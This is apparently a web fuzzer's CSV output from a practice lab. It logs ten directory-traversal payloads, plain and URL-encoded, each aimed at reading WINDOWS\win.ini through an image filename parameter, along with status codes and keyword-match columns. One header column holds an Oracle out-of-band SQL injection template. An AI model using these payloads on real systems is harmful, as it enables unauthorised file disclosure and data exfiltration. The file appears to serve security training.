id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'||Utl_Http.request('http://<yourservername>') from dual--,TimeDelay,ContentLength
id_fuzz_1,1,\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,2,\..\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,3,\..\..\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,4,\..\..\..\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,5,\..\..\..\..\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\..\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,6,\..\..\..\..\..\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\..\..\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,7,%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,8,%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,9,%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,10,%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
